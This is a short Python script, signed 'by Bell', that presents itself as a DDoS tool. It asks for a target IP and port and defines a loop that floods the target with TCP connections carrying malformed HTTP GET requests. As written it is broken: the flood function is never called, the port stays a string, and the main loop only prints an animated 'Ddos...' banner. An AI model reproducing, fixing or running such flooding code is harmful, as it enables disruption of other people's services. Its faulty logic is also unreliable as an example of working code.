
import socket, sys
import subprocess, platform

def clear():
    if platform.system() == "Windows":
        subprocess.Popen("cls",
                         shell=True).communicate()
    else:  # Linux and Mac
        print("\033c", end="")
clear()
print("by Bell")
print("")
print("")
print("")
ip = input(str("IP Target : "))
clear()
print("by Bell")
print("")
print("")
print("")
port = input("Port      : ")
port = port
def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "SHIT" + "HTTP/1.1 \r\n"))
            mysocket.sendto(str.encode("GET " + "SHIT" + "HTTP/1.1 \r\n"), (ip, port) )
        except socket.error:
            print("error")
        mysocket.close()



while True:
     print("")
     print("")
     print("")
     print("")
     print ("Ddos.   on ip:" + str(ip))
     clear()
     print("")
     print("")
     print("")
     print("")
     print("Ddos..   on ip:" + str(ip))
     clear()
     print("")
     print("")
     print("")
     print("")
     print("Ddos...  on ip:" + str(ip))
     clear()
     print("")
     print("")
     print("")
     print("")
     print("Ddos.... on ip:" + str(ip))
     clear()

